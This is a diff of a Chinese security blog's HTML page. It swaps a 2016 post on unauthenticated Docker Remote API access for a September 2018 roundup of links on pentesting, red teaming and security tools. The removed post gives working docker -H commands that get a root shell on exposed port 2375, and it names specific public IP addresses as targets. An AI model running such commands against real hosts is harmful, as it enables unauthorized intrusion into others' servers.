@@ -69,7 +69,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="docker," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -85,21 +85,18 @@
 
 
 
-<meta name="description" content="docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令
-比如访问 http://host:2375/containers/json 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps">
+<meta name="description">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Docker未授权访问">
-<meta property="og:url" content="http://yoursite.com/2016/05/19/Docker未授权访问/index.html">
+<meta property="og:title" content="2018-9月资源汇总">
+<meta property="og:url" content="http://yoursite.com/2018/09/29/2018-9月资源汇总/index.html">
 <meta property="og:site_name" content="EvilAnne's Blog">
-<meta property="og:description" content="docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令
-比如访问 http://host:2375/containers/json 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps">
-<meta property="og:image" content="http://i.imgur.com/6o5b5AU.png">
-<meta property="og:updated_time" content="2016-05-20T04:01:21.256Z">
+<meta property="og:description">
+<meta property="og:image" content="https://i.imgur.com/oiWkoy8.jpg">
+<meta property="og:updated_time" content="2018-09-29T06:41:06.375Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Docker未授权访问">
-<meta name="twitter:description" content="docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令
-比如访问 http://host:2375/containers/json 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps">
-<meta name="twitter:image" content="http://i.imgur.com/6o5b5AU.png">
+<meta name="twitter:title" content="2018-9月资源汇总">
+<meta name="twitter:description">
+<meta name="twitter:image" content="https://i.imgur.com/oiWkoy8.jpg">
 
 
 
@@ -128,7 +125,7 @@
     })();
 </script>
 
-  <title> Docker未授权访问 | EvilAnne's Blog </title>
+  <title> 2018-9月资源汇总 | EvilAnne's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -268,7 +265,7 @@
             
             
               
-                Docker未授权访问
+                2018-9月资源汇总
               
             
           </h1>
@@ -280,8 +277,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-05-19T21:00:39+08:00" content="2016-05-19">
-              2016-05-19
+            <time itemprop="dateCreated" datetime="2018-09-29T14:40:37+08:00" content="2018-09-29">
+              2018-09-29
             </time>
           </span>
 
@@ -294,8 +291,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/网络安全/" itemprop="url" rel="index">
-                    <span itemprop="name">网络安全</span>
+                  <a href="/categories/资讯备忘录/" itemprop="url" rel="index">
+                    <span itemprop="name">资讯备忘录</span>
                   </a>
                 </span>
 
@@ -310,8 +307,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/05/19/Docker未授权访问/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/05/19/Docker未授权访问/" itemprop="commentsCount"></span>
+                <a href="/2018/09/29/2018-9月资源汇总/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2018/09/29/2018-9月资源汇总/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -334,22 +331,100 @@
       
 
       
-        <blockquote>
-<p>docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令</p>
-<p>比如访问 <a href="http://host:2375/containers/json" target="_blank" rel="external">http://host:2375/containers/json</a> 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成.</p>
-</blockquote>
+        <p><img src="https://i.imgur.com/oiWkoy8.jpg" alt=""></p>
 <a id="more"></a>
-<p>漏洞利用，可以直接获取shell权限</p>
-<p>查看版本：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://123.125.105.158:2375/version</span></span><br></pre></td></tr></table></figure>
-<p>有些版本过低，所以docker client无法使用</p>
-<p>安装docker client: </p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://www.docker.com/products/docker-toolbox</span></span><br></pre></td></tr></table></figure>
-<p>首先获取images:</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://180.76.161.55:2375 images</span><br></pre></td></tr></table></figure>
-<p>获取Shell:</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://180.76.161.55:2375 run -it --entrypoint /bin/bash ubuntu "-h"</span><br></pre></td></tr></table></figure>
-<p><img src="http://i.imgur.com/6o5b5AU.png" alt="http://i.imgur.com/6o5b5AU.png"> </p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><ul>
+<li><p><a href="https://paper.tuisec.win/detail/5585e4c457a9333" target="_blank" rel="external">黑客学习资源汇总-渗透测试项目学习资料</a><br><code>国外黑客网站导航，Youtube关于黑客类视频</code></p>
+</li>
+<li><p><a href="https://payatu.com/redteaming-from-zero-to-one-part-1/" target="_blank" rel="external">红队技术从零到一(1)</a></p>
+</li>
+<li><p><a href="https://payatu.com/redteaming-zero-one-part-2/" target="_blank" rel="external">红队技术从堆到一(2)</a></p>
+</li>
+<li><p><a href="https://gist.github.com/caseysmithrc/d48e43770ab4ee161b1a806da8ccf390" target="_blank" rel="external">渗透测试命令列表</a><br><code>渗透中常用命令、从各类APT攻击分析中所提取的</code></p>
+</li>
+<li><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="external">CTF中Web应用程序安全性的Payload和Bypass列表</a><br><code>内容包含：内网渗透、黑客书单</code></p>
+</li>
+<li><p><a href="https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/" target="_blank" rel="external">通过普通用户访问Azure AD管理门户泄露活动目录信息</a></p>
+</li>
+<li><p><a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" target="_blank" rel="external">web waf par1</a></p>
+</li>
+<li><a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" target="_blank" rel="external">web waf par2</a></li>
+<li><p><a href="https://www.secjuice.com/web-application-firewall-waf-evasion/" target="_blank" rel="external">web waf par3</a><br><code>绕WAF技巧</code></p>
+</li>
+<li><p><a href="https://medium.com/@malcomvetter" target="_blank" rel="external">Red Team知识</a></p>
+</li>
+<li><p><a href="https://twitter.com/harr0ey/status/1036087830752239618" target="_blank" rel="external">Word文档内嵌SVG文档ActiveX控件POC</a></p>
+</li>
+<li><p><a href="https://gtfobins.github.io/gtfobins/whois/" target="_blank" rel="external">whois传输文件</a><br><code>老外这种方法都想得出来，通过whois命令传送文件</code></p>
+</li>
+<li><p><a href="https://gtfobins.github.io/" target="_blank" rel="external">各类linux命令执行</a><br><code>除了Whois命令，还有各类命令的用法。超出你的想象</code></p>
+</li>
+<li><p><a href="https://engineeringblog.yelp.com/2018/04/ad-password-blacklisting.html" target="_blank" rel="external">Active Directory密码黑名单</a><br><code>OPF项目检测弱密码</code></p>
+</li>
+<li><p><a href="http://touhidshaikh.com/blog/?p=790" target="_blank" rel="external">滥用SUDO（Linux权限提升）</a><br><code>基于sudoers的规则进行提权，如果没有设置则不行。</code></p>
+</li>
+<li><p><a href="https://www.mdsec.co.uk/2018/09/serverless-red-team-infrastructure-part-1-web-bugs/" target="_blank" rel="external">无服务器红队基础设施：第1部分，Web错误</a></p>
+</li>
+<li><p><a href="https://posts.specterops.io/head-in-the-clouds-bd038bb69e48" target="_blank" rel="external">云网络环境中的安全问题研究</a></p>
+</li>
+<li><p><a href="http://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/" target="_blank" rel="external">使用Metasploit绕过UAC的多种方法</a></p>
+</li>
+<li><p><a href="https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f" target="_blank" rel="external">从ADS流中运行程序的技巧</a></p>
+</li>
+<li><p><a href="http://synack.blog/posts/red-teaming-and-pentesting-tips/index.html" target="_blank" rel="external">Red Teaming和Pentesting技巧</a></p>
+</li>
+<li><p><a href="https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html" target="_blank" rel="external">Linux提权</a><br><code>pentestbook一本书</code></p>
+</li>
+<li><p><a href="https://www.youtube.com/watch?v=N1MEOLiCvBs" target="_blank" rel="external">攻击Exchange/OWA收集域账户信息</a></p>
+</li>
+<li><p><a href="https://github.com/chryzsh/DarthSidious" target="_blank" rel="external">构建Active Directory域并进行黑客攻击</a></p>
+</li>
+</ul>
+<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><ul>
+<li><p><a href="http://tracker.fumik0.com/" target="_blank" rel="external">用于恶意代码追踪的在线网站</a></p>
+</li>
+<li><p><a href="https://psiphon.ca/en/blog/psiphon-a-technical-description" target="_blank" rel="external">Psiphon 3</a><br><code>匿名代理工具</code></p>
+</li>
+<li><p><a href="https://github.com/DamonMohammadbagher/Meterpreter_Payload_Detection" target="_blank" rel="external">在内存中检测Meterpreter工具</a></p>
+</li>
+<li><p><a href="https://www.darknet.org.uk/2018/04/stacoan-mobile-app-static-analysis-tool/" target="_blank" rel="external">移动应用程序静态分析工具</a></p>
+</li>
+<li><p><a href="https://www.darknet.org.uk/2018/04/snallygaster-scan-for-secret-files-on-http-servers/" target="_blank" rel="external">扫描HTTP服务器上的机密文件</a></p>
+</li>
+<li><p><a href="https://sploitus.com/" target="_blank" rel="external">搜索EXP</a></p>
+</li>
+<li><p><a href="https://www.kali.org/tutorials/wireguard-on-kali/" target="_blank" rel="external">Wireguard一种新的VPN将会加入到Kali</a></p>
+</li>
+<li><p><a href="https://github.com/d3vilbug/HackBar" target="_blank" rel="external">BurpSuite插件HackBar</a></p>
+</li>
+<li><p><a href="https://github.com/entropy1337/infernal-twin" target="_blank" rel="external">自动化无线攻击工具</a></p>
+</li>
+<li><p><a href="https://github.com/rmikehodges/hideNsneak" target="_blank" rel="external">hideNsneak - 渗透测试基础设施快速部署工具</a></p>
+</li>
+<li><p><a href="https://github.com/woj-ciech/Danger-zone" target="_blank" rel="external">IP和电子邮件地址之间的数据</a></p>
+</li>
+<li><p><a href="https://paper.seebug.org/710/" target="_blank" rel="external">Java 反编译工具 Luyten</a></p>
+</li>
+<li><p><a href="https://github.com/TunisianEagles/SocialBox" target="_blank" rel="external">社交媒体账户密码暴力破解工具</a></p>
+</li>
+</ul>
+<h2 id="企业安全"><a href="#企业安全" class="headerlink" title="企业安全"></a>企业安全</h2><ul>
+<li><a href="https://www.xsec.io/2018/8/31/emergency-response.html" target="_blank" rel="external">应急响应浅谈</a></li>
+</ul>
+<h2 id="APT报告阅读"><a href="#APT报告阅读" class="headerlink" title="APT报告阅读"></a>APT报告阅读</h2><ul>
+<li><a href="https://marcoramilli.blogspot.com/2018/08/hacking-hacker-stopping-big-botnet.html" target="_blank" rel="external">黑客入侵黑客 停止针对美国，加拿大和意大利的大型僵尸网络</a><br><code>邮箱 -&gt; 分析 -&gt; 找到漏洞 -&gt;拿下控制服务器 -&gt; 获取更多机器包括邮箱密码 -&gt; vps管理平台</code></li>
+</ul>
+<ul>
+<li><a href="https://marcoramilli.blogspot.com/2018/08/interesting-hidden-threat-since-years.html" target="_blank" rel="external">多年来有趣的隐藏威胁？</a></li>
+</ul>
+<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><ul>
+<li><p><a href="https://github.com/trimstray/test-your-sysadmin-skills#regular-sysadmin" target="_blank" rel="external">国外Linux系统管理员测试问答和面试/考试答案</a></p>
+</li>
+<li><p><a href="http://michaellynn.github.io/2018/07/27/booting-secure/" target="_blank" rel="external">关于 MacBook Pro 安全引导的详细介绍</a></p>
+</li>
+<li><p><a href="https://www.sec-un.org/web-3-0%E6%97%B6%E4%BB%A3%E7%9A%84%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%96%B0%E6%80%9D%E8%80%83/" target="_blank" rel="external">WEB 3.0时代的应用安全新思考</a></p>
+</li>
+</ul>
 
       
     </div>
@@ -369,28 +444,18 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/docker/" rel="tag">#docker</a>
-          
-        </div>
-      
 
       
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/05/18/ImageMagick、FFMpeg/" rel="next" title="ImageMagick、FFMpeg">
-                <i class="fa fa-chevron-left"></i> ImageMagick、FFMpeg
+              <a href="/2018/09/15/什么是产品经理？（持续更新）/" rel="next" title="什么是产品经理？（持续更新）">
+                <i class="fa fa-chevron-left"></i> 什么是产品经理？（持续更新）
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/05/20/要什么安逸/" rel="prev" title="要什么安逸">
-                要什么安逸 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -416,8 +481,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/05/19/Docker未授权访问/"
-           data-title="Docker未授权访问" data-url="http://yoursite.com/2016/05/19/Docker未授权访问/">
+      <div class="ds-thread" data-thread-key="2018/09/29/2018-9月资源汇总/"
+           data-title="2018-9月资源汇总" data-url="http://yoursite.com/2018/09/29/2018-9月资源汇总/">
       </div>
     
   </div>
@@ -508,7 +573,7 @@
               
             
             
-              <p class="post-toc-empty">此文章未包含目录</p>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透"><span class="nav-number">1.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tools"><span class="nav-number">2.</span> <span class="nav-text">Tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#企业安全"><span class="nav-number">3.</span> <span class="nav-text">企业安全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#APT报告阅读"><span class="nav-number">4.</span> <span class="nav-text">APT报告阅读</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other"><span class="nav-number">5.</span> <span class="nav-text">Other</span></a></li></ol></div>
             
           </div>
         </section>
